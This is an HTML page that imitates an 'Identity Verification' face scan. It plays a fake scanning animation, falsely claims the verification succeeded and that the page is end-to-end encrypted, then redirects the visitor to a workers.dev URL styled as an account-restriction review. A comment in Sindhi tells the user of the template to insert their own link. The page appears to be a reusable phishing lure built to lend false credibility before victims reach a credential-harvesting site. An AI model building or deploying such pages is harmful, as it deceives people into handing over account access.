<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Verification</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    overflow:hidden;
    background:#030712;
    color:white;
}

.bg1,
.bg2{
    position:absolute;
    border-radius:50%;
    filter:blur(150px);
}

.bg1{
    width:420px;
    height:420px;
    background:#00ffaa;
    top:-100px;
    left:-100px;
    opacity:0.18;
}

.bg2{
    width:420px;
    height:420px;
    background:#0088ff;
    bottom:-100px;
    right:-100px;
    opacity:0.18;
}

.card{
    position:relative;
    width:380px;
    padding:30px;
    border-radius:32px;
    background:rgba(15,23,42,0.88);
    border:1px solid rgba(255,255,255,0.08);
    backdrop-filter:blur(14px);
    box-shadow:
    0 0 50px rgba(0,0,0,0.6),
    inset 0 0 25px rgba(255,255,255,0.03);
    text-align:center;
}

.logo{
    width:90px;
    height:90px;
    margin:auto;
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#00ffaa,#0099ff);
    font-size:42px;
    box-shadow:0 0 35px rgba(0,255,170,0.45);
}

.title{
    margin-top:20px;
    font-size:30px;
    font-weight:bold;
}

.subtitle{
    margin-top:8px;
    color:#94a3b8;
    font-size:14px;
}

.scan-box{
    position:relative;
    width:240px;
    height:290px;
    margin:30px auto;
    border-radius:30px;
    overflow:hidden;
    background:#000;
    border:2px solid rgba(0,255,170,0.6);
    box-shadow:
    0 0 30px rgba(0,255,170,0.25),
    inset 0 0 30px rgba(0,255,170,0.08);
}

.grid{
    position:absolute;
    inset:0;
    background-image:
    linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px);
    background-size:26px 26px;
}

.face{
    position:absolute;
    inset:0;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:135px;
}

.scan-line{
    position:absolute;
    width:100%;
    height:5px;
    background:#00ffaa;
    box-shadow:
    0 0 15px #00ffaa,
    0 0 25px #00ffaa;
    animation:scan 1.8s linear infinite;
}

@keyframes scan{
    0%{
        top:0;
    }

    100%{
        top:100%;
    }
}

.corner{
    position:absolute;
    width:40px;
    height:40px;
    border:4px solid #00ffaa;
}

.tl{
    top:12px;
    left:12px;
    border-right:none;
    border-bottom:none;
}

.tr{
    top:12px;
    right:12px;
    border-left:none;
    border-bottom:none;
}

.bl{
    bottom:12px;
    left:12px;
    border-right:none;
    border-top:none;
}

.br{
    bottom:12px;
    right:12px;
    border-left:none;
    border-top:none;
}

.status{
    font-size:18px;
    margin-top:5px;
    letter-spacing:0.4px;
}

.progress{
    width:100%;
    height:12px;
    background:#111827;
    border-radius:50px;
    overflow:hidden;
    margin-top:20px;
}

.bar{
    width:0%;
    height:100%;
    border-radius:50px;
    background:linear-gradient(90deg,#00ffaa,#0099ff);
    transition:width 5s linear;
}

#submitBtn{
    width:100%;
    padding:15px;
    margin-top:24px;
    border:none;
    border-radius:18px;
    background:linear-gradient(135deg,#2563eb,#3b82f6);
    color:white;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    display:none;
    transition:0.3s;
    box-shadow:0 0 25px rgba(59,130,246,0.35);
}

#submitBtn:hover{
    transform:scale(1.03);
}

.verify-icon{
    margin-top:18px;
    font-size:14px;
    color:#64748b;
}

</style>
</head>

<body>

<div class="bg1"></div>
<div class="bg2"></div>

<div class="card">

    <div class="logo">
        🛡️
    </div>

    <div class="title">
        Identity Verification
    </div>

    <div class="subtitle">
        Secure face authentication system
    </div>

    <div class="scan-box">

        <div class="grid"></div>

        <div class="corner tl"></div>
        <div class="corner tr"></div>
        <div class="corner bl"></div>
        <div class="corner br"></div>

        <div class="face">
            👤
        </div>

        <div class="scan-line"></div>

    </div>

    <div class="status" id="status">
        Scanning biometric identity...
    </div>

    <div class="progress">
        <div class="bar" id="bar"></div>
    </div>

    <button id="submitBtn">
        Continue Verification
    </button>

    <div class="verify-icon">
        End‑to‑End Encrypted Security
    </div>

</div>

<script>

const submitBtn = document.getElementById("submitBtn");
const statusText = document.getElementById("status");
const bar = document.getElementById("bar");

window.onload = ()=>{

    setTimeout(()=>{
        bar.style.width = "100%";
    },100);

    setTimeout(()=>{

        statusText.innerHTML = "Verification Completed Successfully";

        submitBtn.style.display = "block";

    },5000);

};

submitBtn.onclick = ()=>{

    // پنهنجي لنڪ هتي لڳايو
    window.location.href = "https://review-request.restriction-update-issue.workers.dev/";

};

</script>

</body>
</html>
